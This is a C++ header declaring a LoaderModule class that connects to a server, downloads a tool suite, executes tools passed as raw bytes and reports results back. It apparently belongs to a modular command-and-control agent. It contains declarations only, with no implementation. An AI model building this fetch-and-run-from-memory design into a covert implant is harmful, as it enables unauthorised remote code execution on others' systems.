#pragma once
#include "NetworkModule.h"
#include <nlohmann/json.hpp>
#include <string>
#include <vector>

class LoaderModule : public NetworkModule, public IModule {
public:
  LoaderModule(const std::string &server_address, int server_port);
  ~LoaderModule();
  std::string get_module_name() const override;
  void execute_module(const nlohmann::json &instructions) override;

private:
  void execute_tool(const std::vector<std::byte> &tool);
  void download_tool(const nlohmann::json &tool_suite);
  void send_execution_info(const std::string &message);
  std::string m_server_address;
  int m_server_port;
};